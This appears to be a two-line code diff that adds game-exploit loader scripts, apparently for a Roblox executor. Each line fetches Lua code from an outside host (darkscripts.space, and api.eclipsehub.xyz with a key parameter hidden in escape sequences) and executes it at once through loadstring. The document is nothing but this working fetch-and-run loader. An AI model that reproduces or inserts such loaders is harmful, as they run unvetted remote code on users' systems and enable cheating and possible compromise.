@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/b81732cc-ecbe-4c37-babb-bb475529e70a_717504668061794307.lua',true))()      
+getgenv().mainKey = "nil" local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
